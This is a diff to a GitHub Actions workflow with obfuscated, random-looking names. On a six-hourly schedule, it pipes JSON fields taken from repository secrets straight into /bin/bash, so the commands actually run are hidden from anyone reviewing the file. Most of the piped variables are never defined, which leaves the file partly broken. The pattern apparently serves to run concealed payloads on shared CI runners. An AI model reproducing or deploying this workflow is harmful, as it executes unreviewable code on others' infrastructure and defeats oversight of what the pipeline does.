@@ -1,29 +1,25 @@
 name: nongyuxxo
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 5/6 * * *'
-jobs:  # 17283
+    - cron: '15 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nongyuxxo
         env:
-          mypp03: ${{ secrets.mypp03 }}
+          fj95854: ${{ secrets.fj95854 }}
         run: |
-          echo $mypp03 | jq -r .yufi7744 | /bin/bash
-          echo $pk546 | jq -r .gh981 | /bin/bash
-          echo $twram59 | jq -r .il26572 | /bin/bash
-          echo $wiosa4337 | jq -r .y2 | /bin/bash
-          echo $hbalf2 | jq -r .num9 | /bin/bash
-          echo $n50551 | jq -r .jbj910 | /bin/bash
-          echo $fjpxu264 | jq -r .pugc3726 | /bin/bash
-          echo $ookef2 | jq -r .llxrb4 | /bin/bash
-          echo $pkhr176 | jq -r .wyfr65 | /bin/bash
-          echo $dys05385 | jq -r .ktoz92 | /bin/bash
-          echo $sus379 | jq -r .d408 | /bin/bash
-          echo $zz37256 | jq -r .dr945 | /bin/bash
-          echo $sm52 | jq -r .huww65 | /bin/bash
-          echo $ccsci128 | jq -r .a36 | /bin/bash
+          echo $fj95854 | jq -r .raeh5 | /bin/bash
+          echo $u8568 | jq -r .ctrz020 | /bin/bash
+          echo $lqxw04006 | jq -r .dg50 | /bin/bash
+          echo $ajuy75854 | jq -r .lwhlp8 | /bin/bash
+          echo $h53 | jq -r .wikal91 | /bin/bash
+          echo $df9899 | jq -r .fxhsa494 | /bin/bash
+          echo $lvu08675 | jq -r .xw70 | /bin/bash
 
